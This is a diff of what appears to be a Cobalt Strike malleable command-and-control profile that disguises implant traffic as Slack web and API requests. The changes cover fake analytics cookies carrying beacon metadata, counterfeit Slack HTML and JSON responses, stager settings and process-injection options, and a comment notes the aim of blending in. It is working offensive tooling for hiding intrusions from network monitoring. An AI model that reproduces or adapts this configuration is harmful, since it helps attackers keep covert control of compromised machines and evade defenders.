@@ -35,130 +35,114 @@ http-get {
         header "Accept" "*/*";
         header "Accept-Language" "en-US";
         header "Connection" "close";
-	
-        
+
+
         metadata {
-            base64url;
-            
             append ";_ga=GA1.2.875";
             append ";__ar_v4=%8867UMDGS643";
             prepend "d=";
-    #	    prepend "cvo_sid1=R456BNMD64;";
+    	#    prepend "cvo_sid1=R456BNMD64;";
             prepend "_ga=GA1.2.875;";
             prepend "b=.12vPkW22o;";
             header "Cookie";
-
         }
 
     }
 
     server {
-
-	header "Content-Type" "text/html; charset=utf-8";
-	header "Connection" "close";
-	header "Server" "Apache";
-	header "X-XSS-Protection" "0";
-	header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
-	header "Referrer-Policy" "no-referrer";
-	header "X-Slack-Backend" "h";
-	header "Pragma" "no-cache";
-	header "Cache-Control" "private, no-cache, no-store, must-revalidate";
-	header "X-Frame-Options" "SAMEORIGIN";
-	header "Vary" "Accept-Encoding";
-	header "X-Via" "haproxy-www-w6k7";
-        
+        header "Content-Type" "text/html; charset=utf-8";
+        header "Connection" "close";
+        header "Server" "Apache";
+        header "X-XSS-Protection" "0";
+        header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
+        header "Referrer-Policy" "no-referrer";
+        header "X-Slack-Backend" "h";
+        header "Pragma" "no-cache";
+        header "Cache-Control" "private, no-cache, no-store, must-revalidate";
+        header "X-Frame-Options" "SAMEORIGIN";
+        header "Vary" "Accept-Encoding";
+        header "X-Via" "haproxy-www-w6k7";
 
         output {
+            prepend "<!DOCTYPE html>";
+            prepend "<html lang=\"en-US\" class=\"supports_custom_scrollbar\">";
+            prepend "<head>";
+            prepend "<meta charset=\"utf-8\">";
+            prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">";
+            prepend "<meta name=\"referrer\" content=\"no-referrer\">";
+            prepend "<meta name=\"superfish\" content=\"nofish\">";
+            prepend "<title>Microsoft Developer Chat Slack</title>";
+            prepend "<meta name=\"author\" content=\"Slack\">";
+            prepend "<link rel=\"dns-prefetch\" href=\"https://a.slack-edge.com?id=";
 
-            base64url;
-
-#             prepend "<!DOCTYPE html>";
-#             prepend "<html lang=\"en-US\" class=\"supports_custom_scrollbar\">";
-#             prepend "<head>";
-#             prepend "<meta charset=\"utf-8\">";
-#             prepend "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">";
-#             prepend "<meta name=\"referrer\" content=\"no-referrer\">";
-#             prepend "<meta name=\"superfish\" content=\"nofish\">";
-#             prepend "<title>Microsoft Developer Chat Slack</title>";
-#             prepend "<meta name=\"author\" content=\"Slack\">";
-#             prepend "<link rel=\"dns-prefetch\" href=\"https://a.slack-edge.com?id=";
-#
-# 	        append "\"> </script>";
-# 	        append "<div id=\"client-ui\" class=\"container-fluid sidebar_theme_\"\"\">";
-#             append "<div id=\"banner\" class=\"hidden\" role=\"complementary\" aria-labelledby=\"notifications_banner_aria_label\">";
-#             append "<h1 id=\"notifications_banner_aria_label\" class=\"offscreen\">Notifications Banner</h1>";
-#             append "<div id=\"notifications_banner\" class=\"banner sk_fill_blue_bg hidden\">";
-#             append "Slack needs your permission to <button type=\"button\" class=\"btn_link\">enable desktop notifications</button>.<button type=\"button\" class=\"btn_unstyle banner_dismiss ts_icon ts_icon_times_circle\" data-action=\"dismiss_banner\" aria-label=\"Dismiss\"></button>";
-#             append "</div>";
-#             append "<div id=\"notifications_dismiss_banner\" class=\"banner seafoam_green_bg hidden\">";
-#             append "We strongly recommend enabling desktop notifications if you’ll be using Slack on this computer.<span class=\"inline_block no_wrap\">";
-#             append "<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close(); TS.ui.banner.growlsPermissionPrompt();\">Enable notifications</button>";
-#             append "<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close()\">Ask me next time</button>";
-#             append "<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.closeNagAndSetCookie()\">Never ask again on this computer</button>";
-#             append "</span>";
-#             append "</div>";
-
+	        append "\"> </script>";
+	        append "<div id=\"client-ui\" class=\"container-fluid sidebar_theme_\"\"\">";
+            append "<div id=\"banner\" class=\"hidden\" role=\"complementary\" aria-labelledby=\"notifications_banner_aria_label\">";
+            append "<h1 id=\"notifications_banner_aria_label\" class=\"offscreen\">Notifications Banner</h1>";
+            append "<div id=\"notifications_banner\" class=\"banner sk_fill_blue_bg hidden\">";
+            append "Slack needs your permission to <button type=\"button\" class=\"btn_link\">enable desktop notifications</button>.<button type=\"button\" class=\"btn_unstyle banner_dismiss ts_icon ts_icon_times_circle\" data-action=\"dismiss_banner\" aria-label=\"Dismiss\"></button>";
+            append "</div>";
+            append "<div id=\"notifications_dismiss_banner\" class=\"banner seafoam_green_bg hidden\">";
+            append "We strongly recommend enabling desktop notifications if you’ll be using Slack on this computer.<span class=\"inline_block no_wrap\">";
+            append "<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close(); TS.ui.banner.growlsPermissionPrompt();\">Enable notifications</button> •";
+            append "<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close()\">Ask me next time</button> •";
+            append "<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.closeNagAndSetCookie()\">Never ask again on this computer</button>";
+            append "</span>";
+            append "</div>";
             print;
         }
     }
 }
 
 http-post {
-    
+
     set uri "/api/api.test";
 
     client {
 
 #	header "Host" "msdevchat.slack.com";
 	header "Accept" "*/*";
-	header "Accept-Language" "en-US";     
-        
+	header "Accept-Language" "en-US";
+
         output {
-            base64url;
-	    
-            append ";_ga=GA1.2.875";
+        	append ";_ga=GA1.2.875";
             append "__ar_v4=%8867UMDGS643";
             prepend "d=";
     #	    prepend "cvo_sid1=R456BNMD64;";
             prepend "_ga=GA1.2.875;";
             prepend "b=.12vPkW22o;";
             header "Cookie";
-
             print;
-
         }
 
 
         id {
 #not sure on this, just trying to blend it in.
-            base64url;
             prepend "GA1.";
-
+            header "_ga";
         }
     }
 
     server {
 
-	header "Content-Type" "application/json; charset=utf-8";
-	header "Connection" "close";
-	header "Server" "Apache";
-	header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
-	header "Referrer-Policy" "no-referrer";
-	header "X-Content-Type-Options" "nosniff";
-	header "X-Slack-Req-Id" "6319165c-f976-4d0666532";
-	header "X-XSS-Protection" "0";
-	header "X-Slack-Backend" "h";
-	header "Vary" "Accept-Encoding";
-	header "Access-Control-Allow-Origin" "*";
-	header "X-Via" "haproxy-www-6g1x";
-        
+        header "Content-Type" "application/json; charset=utf-8";
+        header "Connection" "close";
+        header "Server" "Apache";
+        header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
+        header "Referrer-Policy" "no-referrer";
+        header "X-Content-Type-Options" "nosniff";
+        header "X-Slack-Req-Id" "6319165c-f976-4d0666532";
+        header "X-XSS-Protection" "0";
+        header "X-Slack-Backend" "h";
+        header "Vary" "Accept-Encoding";
+        header "Access-Control-Allow-Origin" "*";
+        header "X-Via" "haproxy-www-6g1x";
+
 
         output {
             base64;
-
-	        prepend "{\"ok\":true,\"args\":{\"user_id\":\"LUMK4GB8C\",\"team_id\":\"T0527B0J3\",\"version_ts\":\"";
+        	prepend "{\"ok\":true,\"args\":{\"user_id\":\"LUMK4GB8C\",\"team_id\":\"T0527B0J3\",\"version_ts\":\"";
 	        append "\"},\"warning\":\"superfluous_charset\",\"response_metadata\":{\"warnings\":[\"superfluous_charset\"]}}";
-
             print;
         }
     }
@@ -177,7 +161,7 @@ http-stager {
     }
 
     server {
-	    header "Content-Type" "text/html; charset=utf-8";
+        header "Content-Type" "text/html; charset=utf-8";
         header "Connection" "close";
         header "Server" "Apache";
         header "X-XSS-Protection" "0";
@@ -189,7 +173,7 @@ http-stager {
         header "X-Frame-Options" "SAMEORIGIN";
         header "Vary" "Accept-Encoding";
         header "X-Via" "haproxy-www-suhx";
-    
+
     }
 
 
@@ -210,7 +194,7 @@ post-ex {
 
 }
 
-#used peclone on wwanmm.dll. 
+#used peclone on wwanmm.dll.
 #don't use 'set image_size_xx' if using 'set module_xx'
 stage {
 	set checksum       "0";
@@ -247,14 +231,14 @@ stage {
 }
 process-inject {
 
-    set allocator "NtMapViewOfSection";		
+    set allocator "NtMapViewOfSection";
 
     set min_alloc "16700";
 
-    set userwx "false";  
-    
+    set userwx "false";
+
     set startrwx "true";
-        
+
     transform-x86 {
         prepend "\x90\x90\x90";
     }
